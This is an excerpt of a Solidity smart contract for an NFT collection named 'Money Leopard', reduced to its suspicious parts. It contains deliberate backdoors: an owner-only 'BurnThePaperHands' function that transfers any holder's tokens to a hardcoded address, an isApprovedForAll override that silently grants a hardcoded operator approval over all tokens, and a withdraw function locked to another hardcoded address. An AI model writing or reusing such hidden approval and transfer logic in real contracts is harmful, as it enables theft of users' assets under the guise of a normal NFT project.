...
contract Money_Leopard is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Money Leopard", "ML", maxBatchSize_, collectionSize_) {
  ...
  function BurnThePaperHands(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xAAEcFeA3b98a9f679dCc816dE70695C732774FFe, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x0a270b50388031950BBb5edA246176A23Ee17B0e);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4Bd82a20d2EFb2cbB899720de720E361dc848436){return true;}
